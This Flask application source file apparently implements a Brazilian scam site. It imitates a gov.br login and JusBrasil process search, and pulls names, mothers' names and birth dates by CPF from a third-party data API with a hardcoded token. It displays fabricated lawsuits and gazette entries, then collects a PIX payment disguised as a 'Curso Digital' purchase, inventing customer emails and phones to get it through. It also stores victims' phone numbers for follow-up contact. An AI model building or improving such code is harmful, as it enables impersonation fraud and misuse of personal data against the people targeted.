import os
import logging
import requests
from datetime import datetime
import pytz
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
from werkzeug.middleware.proxy_fix import ProxyFix

# Configure logging for production
log_level = logging.INFO if os.environ.get('FLASK_ENV') == 'production' else logging.DEBUG
logging.basicConfig(level=log_level)

# Create Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET")
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

# Database configuration - Fix for Heroku (postgres:// -> postgresql://)
database_url = os.environ.get("DATABASE_URL", "")
if database_url.startswith("postgres://"):
    database_url = database_url.replace("postgres://", "postgresql://", 1)
app.config["SQLALCHEMY_DATABASE_URI"] = database_url
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}

# Initialize database
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)
db.init_app(app)

# Model for storing phone contacts
class ContatoRequerido(db.Model):
    """Armazena telefones dos requeridos para contato posterior"""
    __tablename__ = 'contato_requerido'
    
    id = db.Column(db.Integer, primary_key=True)
    cpf = db.Column(db.String(14), nullable=False)
    nome = db.Column(db.String(200), nullable=True)
    telefone = db.Column(db.String(20), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

def clean_cpf(cpf):
    """Remove pontos, traços e espaços do CPF"""
    if not cpf:
        return cpf
    return ''.join(filter(str.isdigit, cpf))

def get_cpf_api_url(cpf):
    """Obter URL da API de CPF com token seguro - Amnesia Tecnologia"""
    cpf_api_token = os.environ.get("CPF_API_TOKEN", "261207b9-0ec2-468a-ac04-f9d38a51da88")
    
    clean_cpf_number = clean_cpf(cpf)
    
    return f"https://api.amnesiatecnologia.rocks/?token={cpf_api_token}&cpf={clean_cpf_number}"

def parse_cpf_api_response(data):
    """
    Parsear resposta da API de CPF (Amnesia Tecnologia)
    Nova API retorna: { "DADOS": { "cpf": "...", "nome": "...", "nome_mae": "...", "data_nascimento": "...", "sexo": "..." } }
    """
    if 'DADOS' in data:
        cpf_data = data['DADOS']
        return {
            'nome': cpf_data.get('nome', ''),
            'cpf': cpf_data.get('cpf', ''),
            'data_nascimento': cpf_data.get('data_nascimento', ''),
            'nome_mae': cpf_data.get('nome_mae', ''),
            'sexo': cpf_data.get('sexo', '')
        }
    return None

# Sample data structure for demonstration (in production this would come from a database)
SAMPLE_PERSONS = [
    {
        'id': 1,
        'name': 'Usuário',
        'age_range': '18 a 24 anos',
        'location': 'Goiás',
        'cpf_masked': '***.***.***-**',
        'processes_count': 3,
        'has_processes': True
    },
    {
        'id': 2,
        'name': 'Usuário',
        'age_range': '25 a 35 anos',
        'location': 'São Paulo',
        'cpf_masked': '***.***.***-**',
        'processes_count': 1,
        'has_processes': True
    },
    {
        'id': 3,
        'name': 'Usuário',
        'age_range': '30 a 40 anos',
        'location': 'Rio de Janeiro',
        'cpf_masked': '***.***.***-**',
        'processes_count': 0,
        'has_processes': False
    }
]

SAMPLE_PROCESSES = [
    {
        'id': 1,
        'number': '5008264-89.2023.8.09.0137',
        'tribunal': 'TJGO - Tribunal de Justiça de Goiás',
        'type': 'Ação de Cobrança',
        'status': 'Em andamento',
        'last_update': '15/01/2025',
        'parties': {
            'polo_ativo': 'USUÁRIO',
            'polo_passivo': 'USUÁRIO',
            'advogado': 'USUÁRIO'
        },
        'movements': [
            {
                'date': '15/01/2025',
                'description': 'Juntada de petição'
            },
            {
                'date': '10/01/2025',
                'description': 'Intimação das partes'
            },
            {
                'date': '05/01/2025',
                'description': 'Distribuição do processo'
            }
        ]
    }
]

OFFICIAL_DIARIES = [
    {
        'content': 'USUÁRIO POLO PASSIVO : USUÁRIO SEGREDO JUSTIÇA : NÃO PARTE INTIMADA : USUÁRIO ADVG... PARTE : 50826 GO - USUÁRIO PARTE INTIMADA : USUÁRIO...',
        'date': '15/01/2025',
        'source': 'Diário Oficial do Estado de Goiás'
    }
]

@app.route('/')
def home():
    """Redirect directly to login page"""
    return redirect(url_for('login'))


@app.route('/inicio')
@app.route('/inicio/<cpf>')
def index(cpf=None):
    """Homepage with search functionality"""
    user_data = None
    payment_approved = request.args.get('paid', 'false').lower() == 'true'
    
    # Get current date in Brazil timezone
    brazil_tz = pytz.timezone('America/Sao_Paulo')
    current_date = datetime.now(brazil_tz)
    current_date_formatted = current_date.strftime('%d/%m/%Y')
    
    if cpf:
        # Buscar dados do CPF via API
        try:
            api_url = get_cpf_api_url(cpf)
            response = requests.get(api_url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                parsed_data = parse_cpf_api_response(data)
                if parsed_data:
                    user_data = parsed_data
                    logging.info(f"Dados encontrados para CPF: {cpf} - Nome: {user_data['nome']}")
                else:
                    logging.warning(f"CPF não encontrado: {cpf}")
            else:
                logging.error(f"Erro na API para CPF {cpf}: {response.status_code}")
        except Exception as e:
            logging.error(f"Erro ao consultar CPF {cpf}: {str(e)}")
    
    logging.info(f"Renderizando template com user_data: {user_data}")
    return render_template('index.html', user_data=user_data, current_date=current_date_formatted, payment_approved=payment_approved)

@app.route('/search', methods=['GET', 'POST'])
def search():
    """Search page for processes and people"""
    if request.method == 'POST':
        search_term = request.form.get('search_term', '').strip()
        search_type = request.form.get('search_type', 'name')
        
        if not search_term:
            flash('Por favor, digite um termo para busca.', 'error')
            return render_template('search.html')
        
        # Filter persons based on search term
        found_persons = []
        for person in SAMPLE_PERSONS:
            if search_term.lower() in person['name'].lower():
                found_persons.append(person)
        
        return render_template('search.html', 
                             search_term=search_term,
                             persons=found_persons,
                             diaries=OFFICIAL_DIARIES if found_persons else [])
    
    return render_template('search.html')

@app.route('/person/<int:person_id>')
def person_profile(person_id):
    """Person profile page showing their processes"""
    person = None
    for p in SAMPLE_PERSONS:
        if p['id'] == person_id:
            person = p
            break
    
    if not person:
        flash('Pessoa não encontrada.', 'error')
        return redirect(url_for('login'))
    
    # Get processes for this person
    person_processes = []
    if person['has_processes']:
        person_processes = SAMPLE_PROCESSES
    
    return render_template('person_profile.html', 
                         person=person, 
                         processes=person_processes)

@app.route('/process/<int:process_id>')
def process_details(process_id):
    """Process details page"""
    process = None
    for p in SAMPLE_PROCESSES:
        if p['id'] == process_id:
            process = p
            break
    
    if not process:
        flash('Processo não encontrado.', 'error')
        return redirect(url_for('login'))
    
    return render_template('process_details.html', process=process)

@app.route('/processo')
@app.route('/processo/<cpf>')
def processo(cpf=None):
    """Página de processo com informações de pagamento"""
    user_data = None
    
    # Get current date in Brazil timezone
    brazil_tz = pytz.timezone('America/Sao_Paulo')
    current_date = datetime.now(brazil_tz)
    current_date_formatted = current_date.strftime('%d/%m/%Y')
    
    if cpf:
        # Buscar dados do CPF via API
        try:
            api_url = get_cpf_api_url(cpf)
            response = requests.get(api_url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                parsed_data = parse_cpf_api_response(data)
                if parsed_data:
                    user_data = parsed_data
                    logging.info(f"Dados encontrados para CPF: {cpf} - Nome: {user_data['nome']}")
                else:
                    logging.warning(f"CPF não encontrado: {cpf}")
            else:
                logging.error(f"Erro na API para CPF {cpf}: {response.status_code}")
        except Exception as e:
            logging.error(f"Erro ao consultar CPF {cpf}: {str(e)}")
    
    # Verificar se o usuário pagou
    paid = request.args.get('paid', 'false').lower() == 'true'
    
    return render_template('processo.html', user_data=user_data, current_date=current_date_formatted, paid=paid)

@app.route('/checkout')
@app.route('/checkout/<cpf>')
def checkout(cpf=None):
    """Página de checkout com pagamento PIX"""
    user_data = None
    
    if cpf:
        # Buscar dados do CPF via API
        try:
            api_url = get_cpf_api_url(cpf)
            response = requests.get(api_url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                parsed_data = parse_cpf_api_response(data)
                if parsed_data:
                    # Gerar email dinâmico baseado no nome e CPF
                    first_name = parsed_data.get('nome', 'cliente').split()[0].lower() if parsed_data.get('nome') and ' ' in parsed_data.get('nome', '') else 'cliente'
                    cpf_digits = ''.join(filter(str.isdigit, parsed_data.get('cpf', '')))
                    cpf_suffix = cpf_digits[-4:] if len(cpf_digits) >= 4 else '0000'
                    user_email = f"{first_name}{cpf_suffix}@cursodigital.com"
                    
                    user_data = parsed_data
                    user_data['email'] = user_email
                    logging.info(f"Dados encontrados para CPF: {cpf} - Nome: {user_data['nome']}, Email: {user_email}")
                else:
                    logging.warning(f"CPF não encontrado: {cpf}")
            else:
                logging.error(f"Erro na API para CPF {cpf}: {response.status_code}")
        except Exception as e:
            logging.error(f"Erro ao consultar CPF {cpf}: {str(e)}")
    
    return render_template('checkout_standalone.html', user_data=user_data)


@app.route('/api/gerar-pix', methods=['POST'])
def gerar_pix():
    """Gerar PIX usando 4M Payments"""
    try:
        data = request.get_json()
        logging.info(f"Dados recebidos para PIX: {data}")
        
        # Dados do usuário com validação
        user_name = data.get('nome', '').strip()
        user_cpf = data.get('cpf', '').strip()
        user_email = data.get('email', '').strip()
        user_phone = data.get('telefone', '').strip()
        
        # Validar se temos dados mínimos
        if not user_name or user_name == '':
            user_name = 'Cliente Curso Digital'
        if not user_cpf or user_cpf == '':
            user_cpf = '00000000191'
            
        # Gerar email e telefone dinâmicos baseados no CPF
        cpf_digits = ''.join(filter(str.isdigit, user_cpf))
        if not user_email or user_email == '':
            first_name = user_name.split()[0].lower() if user_name and ' ' in user_name else 'cliente'
            cpf_suffix = cpf_digits[-4:] if len(cpf_digits) >= 4 else '0000'
            user_email = f"{first_name}{cpf_suffix}@cursodigital.com"
        
        # Gerar telefone baseado no CPF se não fornecido
        if not user_phone:
            phone_suffix = cpf_digits[-8:] if len(cpf_digits) >= 8 else '99999999'
            user_phone = f"11{phone_suffix}"
        
        logging.info(f"Dados processados - Nome: {user_name}, CPF: ***{user_cpf[-4:]}, Email: {user_email}")
        
        # Criar PIX via 4M Payments
        try:
            from four_m_gateway import create_fourm_pix
            
            logging.info("Criando PIX via 4M Payments")
            
            # Criar PIX via 4M Payments
            result = create_fourm_pix(
                customer_name=user_name,
                customer_email=user_email,
                customer_cpf=user_cpf,
                customer_phone=user_phone,
                amount=24.90,
                description="Curso Digital"
            )
            
            if result and result.get('success'):
                logging.info("4M Payments PIX criado com sucesso")
                return jsonify(result)
            else:
                error_msg = result.get('error', 'Erro desconhecido') if result else 'Falha na criação do PIX'
                logging.error(f"4M Payments falhou: {error_msg}")
                return jsonify({
                    "success": False,
                    "error": f"Erro 4M Payments: {error_msg}"
                }), 500
                
        except Exception as e:
            logging.error(f"Erro 4M Payments: {str(e)}")
            return jsonify({
                "success": False,
                "error": f"Erro no gateway 4M Payments: {str(e)}"
            }), 500
            
    except Exception as e:
        logging.error(f"Erro geral PIX: {str(e)}")
        return jsonify({
            "success": False,
            "error": "Erro ao processar pagamento. Tente novamente."
        }), 500


@app.route('/api/gerar-pix-4m', methods=['POST'])
def gerar_pix_4m():
    """Gerar PIX usando 4M Payments"""
    try:
        data = request.get_json()
        logging.info(f"Dados recebidos para PIX 4M: {data}")
        
        # Dados do usuário
        user_name = data.get('nome', '').strip()
        user_cpf = data.get('cpf', '').strip()
        user_email = data.get('email', '').strip()
        user_phone = data.get('telefone', '').strip()
        
        # Validar dados mínimos
        if not user_name:
            user_name = 'Cliente Curso Digital'
        if not user_cpf:
            user_cpf = '00000000191'
        
        # Gerar email e telefone dinâmicos se não fornecidos
        cpf_digits = ''.join(filter(str.isdigit, user_cpf))
        if not user_email:
            first_name = user_name.split()[0].lower() if ' ' in user_name else 'cliente'
            cpf_suffix = cpf_digits[-4:] if len(cpf_digits) >= 4 else '0000'
            user_email = f"{first_name}{cpf_suffix}@cursodigital.com"
        
        if not user_phone:
            phone_suffix = cpf_digits[-8:] if len(cpf_digits) >= 8 else '99999999'
            user_phone = f"11{phone_suffix}"
        
        logging.info(f"Dados 4M processados - Nome: {user_name}, CPF: ***{user_cpf[-4:]}")
        
        # Criar PIX via 4M Payments
        from four_m_gateway import create_fourm_pix
        
        result = create_fourm_pix(
            customer_name=user_name,
            customer_email=user_email,
            customer_cpf=user_cpf,
            customer_phone=user_phone,
            amount=24.90,
            description="Curso Digital"
        )
        
        if result.get('success'):
            logging.info(f"✅ PIX 4M criado: {result.get('transaction_id')}")
            return jsonify(result), 200
        else:
            logging.error(f"❌ Erro 4M: {result.get('error')}")
            return jsonify(result), 400
            
    except Exception as e:
        logging.error(f"Erro ao criar PIX 4M: {str(e)}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route('/api/verificar-status-4m/<transaction_id>', methods=['GET'])
def verificar_status_4m(transaction_id):
    """Verificar status de pagamento 4M Payments"""
    try:
        logging.info(f"Verificando status 4M: {transaction_id}")
        
        from four_m_gateway import check_fourm_status
        
        result = check_fourm_status(transaction_id)
        
        if result.get('success'):
            status = result.get('status')
            logging.info(f"✅ Status 4M: {status}")
            return jsonify(result), 200
        else:
            logging.error(f"❌ Erro ao verificar 4M: {result.get('error')}")
            return jsonify(result), 400
            
    except Exception as e:
        logging.error(f"Erro ao verificar status 4M: {str(e)}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route('/api/gerar-pix-blackcat', methods=['POST'])
def gerar_pix_blackcat():
    """Gerar PIX usando BlackCat Pagamentos"""
    try:
        data = request.get_json()
        logging.info(f"Dados recebidos para PIX BlackCat: {data}")
        
        # Dados do usuário
        user_name = data.get('nome', '').strip()
        user_cpf = data.get('cpf', '').strip()
        user_email = data.get('email', '').strip()
        user_phone = data.get('telefone', '').strip()
        
        # Validar dados mínimos
        if not user_name:
            user_name = 'Cliente Curso Digital'
        if not user_cpf:
            user_cpf = '00000000191'
        
        # Gerar email e telefone dinâmicos se não fornecidos
        cpf_digits = ''.join(filter(str.isdigit, user_cpf))
        if not user_email:
            first_name = user_name.split()[0].lower() if ' ' in user_name else 'cliente'
            cpf_suffix = cpf_digits[-4:] if len(cpf_digits) >= 4 else '0000'
            user_email = f"{first_name}{cpf_suffix}@cursodigital.com"
        
        if not user_phone:
            phone_suffix = cpf_digits[-8:] if len(cpf_digits) >= 8 else '99999999'
            user_phone = f"11{phone_suffix}"
        
        logging.info(f"Dados BlackCat processados - Nome: {user_name}, CPF: ***{user_cpf[-4:]}")
        
        # Criar PIX via BlackCat Pagamentos
        from blackcat_gateway import create_blackcat_pix
        
        # Converter valor de reais para centavos (R$ 24,90 = 2490 centavos)
        amount_cents = int(24.90 * 100)
        
        result = create_blackcat_pix(
            customer_name=user_name,
            customer_email=user_email,
            customer_cpf=user_cpf,
            customer_phone=user_phone,
            amount_cents=amount_cents,
            description="Curso Digital"
        )
        
        if result.get('success'):
            logging.info(f"✅ PIX BlackCat criado: {result.get('transaction_id')}")
            return jsonify(result), 200
        else:
            logging.error(f"❌ Erro BlackCat: {result.get('error')}")
            return jsonify(result), 400
            
    except Exception as e:
        logging.error(f"Erro ao criar PIX BlackCat: {str(e)}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route('/api/verificar-status-blackcat/<transaction_id>', methods=['GET'])
def verificar_status_blackcat(transaction_id):
    """Verificar status de pagamento BlackCat Pagamentos"""
    try:
        logging.info(f"Verificando status BlackCat: {transaction_id}")
        
        from blackcat_gateway import check_blackcat_status
        
        result = check_blackcat_status(transaction_id)
        
        if result.get('success'):
            status = result.get('status')
            paid = result.get('paid', False)
            logging.info(f"✅ Status BlackCat: {status} - Pago: {paid}")
            return jsonify(result), 200
        else:
            logging.error(f"❌ Erro ao verificar BlackCat: {result.get('error')}")
            return jsonify(result), 400
            
    except Exception as e:
        logging.error(f"Erro ao verificar status BlackCat: {str(e)}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/salvar-telefone', methods=['POST'])
def salvar_telefone():
    """Salvar telefone do requerido para contato posterior"""
    try:
        data = request.get_json()
        cpf = data.get('cpf', '').strip()
        nome = data.get('nome', '').strip()
        telefone = data.get('telefone', '').strip()
        
        if not telefone:
            return jsonify({
                "success": False,
                "error": "Telefone é obrigatório"
            }), 400
        
        # Limpar telefone - manter apenas dígitos
        telefone_limpo = ''.join(filter(str.isdigit, telefone))
        
        if len(telefone_limpo) < 10 or len(telefone_limpo) > 11:
            return jsonify({
                "success": False,
                "error": "Telefone inválido. Use o formato (XX) XXXXX-XXXX"
            }), 400
        
        # Verificar se já existe contato com esse CPF
        contato_existente = ContatoRequerido.query.filter_by(cpf=cpf).first() if cpf else None
        
        if contato_existente:
            # Atualizar telefone existente
            contato_existente.telefone = telefone_limpo
            contato_existente.nome = nome or contato_existente.nome
            db.session.commit()
            logging.info(f"Telefone atualizado para CPF: {cpf}")
        else:
            # Criar novo contato
            novo_contato = ContatoRequerido(
                cpf=cpf or 'nao_informado',
                nome=nome,
                telefone=telefone_limpo
            )
            db.session.add(novo_contato)
            db.session.commit()
            logging.info(f"Novo contato salvo - CPF: {cpf}, Telefone: {telefone_limpo}")
        
        return jsonify({
            "success": True,
            "message": "Telefone salvo com sucesso"
        }), 200
        
    except Exception as e:
        logging.error(f"Erro ao salvar telefone: {str(e)}")
        db.session.rollback()
        return jsonify({
            "success": False,
            "error": "Erro ao salvar telefone"
        }), 500


def calculate_crc16(data):
    """Calcular CRC16-CCITT para código PIX"""
    crc = 0xFFFF
    for byte in data.encode('utf-8'):
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc <<= 1
            crc &= 0xFFFF
    return f"{crc:04X}"

def create_real_qr_code(text):
    """Criar QR Code real usando biblioteca qrcode"""
    try:
        import qrcode as qr_lib
        import io
        import base64
        
        # Criar QR Code usando função make diretamente
        img = qr_lib.make(text)
        
        # Converter para base64
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        buffer.seek(0)
        img_data = buffer.getvalue()
        img_base64 = base64.b64encode(img_data).decode()
        
        return f"data:image/png;base64,{img_base64}"
        
    except ImportError:
        # Fallback para SVG se qrcode não disponível
        return create_svg_qr_fallback(text)

def create_svg_qr_fallback(text):
    """Criar QR Code SVG quando biblioteca não está disponível"""
    import hashlib
    
    # Usar hash para criar padrão visual
    hash_obj = hashlib.md5(text.encode())
    hex_dig = hash_obj.hexdigest()
    
    # Criar padrão de quadrados baseado no hash
    size = 200
    block_size = 8
    blocks_per_row = size // block_size
    
    svg_blocks = []
    for i in range(0, len(hex_dig), 2):
        if i // 2 >= blocks_per_row * blocks_per_row:
            break
        hex_val = int(hex_dig[i:i+2], 16)
        if hex_val > 127:  # Se valor for alto, desenhar bloco preto
            row = (i // 2) // blocks_per_row
            col = (i // 2) % blocks_per_row
            x = col * block_size
            y = row * block_size
            svg_blocks.append(f'<rect x="{x}" y="{y}" width="{block_size}" height="{block_size}" fill="black"/>')
    
    blocks_str = ''.join(svg_blocks)
    
    svg = f"""data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 {size} {size}' width='{size}' height='{size}'%3E
    %3Crect width='{size}' height='{size}' fill='white'/%3E
    {blocks_str.replace('<', '%3C').replace('>', '%3E').replace('"', '%22')}
    %3Ctext x='100' y='15' text-anchor='middle' font-size='10' font-family='Arial'%3EPIX R%24 29%2C90%3C/text%3E
    %3C/svg%3E"""
    
    return svg

# Armazenar timestamps dos pagamentos criados
payment_timestamps = {}



@app.route('/api/verificar-pagamento/<transaction_hash>')
def verificar_pagamento(transaction_hash):
    """Verificar status do pagamento PIX usando 4M Payments"""
    try:
        import time
        current_time = time.time()
        
        # Se não temos o timestamp deste pagamento, armazenar
        if transaction_hash not in payment_timestamps:
            payment_timestamps[transaction_hash] = current_time
        
        # Calcular idade do pagamento para logs
        payment_age = current_time - payment_timestamps[transaction_hash]
        
        # 4M Payments: verificação de status
        try:
            from four_m_gateway import check_fourm_status
            
            logging.info(f"Verificando status 4M Payments: {transaction_hash}")
            
            result = check_fourm_status(transaction_hash)
            
            if result.get('success'):
                status = result.get('status', 'pending')
                paid = status in ['paid', 'completed', 'approved']
                
                logging.info(f"Status 4M Payments verificado: {status} - Pago: {paid}")
                
                return jsonify({
                    'success': True,
                    'status': status,
                    'paid': paid,
                    'provider': '4M Payments',
                    'transaction_hash': transaction_hash,
                    'message': 'Pagamento confirmado!' if paid else 'Aguardando pagamento...'
                })
            else:
                logging.warning(f"Erro ao verificar pagamento 4M: {result.get('error')}")
                return jsonify({
                    'success': True,
                    'status': 'pending',
                    'paid': False,
                    'provider': '4M Payments',
                    'transaction_hash': transaction_hash,
                    'message': 'Verificando pagamento...'
                })
            
        except Exception as e:
            logging.error(f"Erro ao verificar pagamento 4M: {str(e)}")
            return jsonify({
                'success': True,
                'status': 'pending',
                'paid': False,
                'provider': '4M Payments',
                'transaction_hash': transaction_hash,
                'message': 'Verificando pagamento...'
            })
            
    except Exception as e:
        logging.error(f"Erro ao verificar pagamento: {str(e)}")
        return jsonify({
            'success': True,
            'status': 'pending',
            'paid': False,
            'message': 'Verificando pagamento...',
            'note': 'Sistema processando verificação',
            'provider': 'Sistema de Fallback'
        })

@app.route('/login')
def login():
    """Login page with gov.br style authentication"""
    return render_template('login.html')


@app.route('/api/consultar-cpf', methods=['POST'])
def consultar_cpf():
    """API endpoint to validate CPF and return user data"""
    try:
        data = request.get_json()
        cpf = data.get('cpf', '').strip()
        
        if not cpf:
            return jsonify({'success': False, 'error': 'CPF nao informado'})
        
        cpf_clean = clean_cpf(cpf)
        
        if len(cpf_clean) != 11:
            return jsonify({'success': False, 'error': 'CPF deve ter 11 digitos'})
        
        api_url = get_cpf_api_url(cpf_clean)
        response = requests.get(api_url, timeout=10)
        
        if response.status_code == 200:
            api_data = response.json()
            
            if 'DADOS' in api_data and api_data['DADOS']:
                logging.info(f"CPF validado com sucesso: ***{cpf_clean[-4:]}")
                return jsonify({
                    'success': True,
                    'data': api_data
                })
            else:
                return jsonify({'success': False, 'error': 'CPF nao encontrado na base de dados'})
        else:
            logging.error(f"Erro na API de CPF: {response.status_code}")
            return jsonify({'success': False, 'error': 'Erro ao consultar CPF. Tente novamente.'})
            
    except requests.exceptions.Timeout:
        return jsonify({'success': False, 'error': 'Tempo esgotado. Tente novamente.'})
    except Exception as e:
        logging.error(f"Erro ao consultar CPF: {str(e)}")
        return jsonify({'success': False, 'error': 'Erro interno. Tente novamente.'})


@app.route('/consulta-processual')
def consulta_processual():
    """Direct route to match JusBrasil URL structure"""
    return redirect(url_for('search'))

@app.errorhandler(404)
def not_found(error):
    return render_template('index.html'), 404

@app.errorhandler(500)
def server_error(error):
    return render_template('index.html'), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
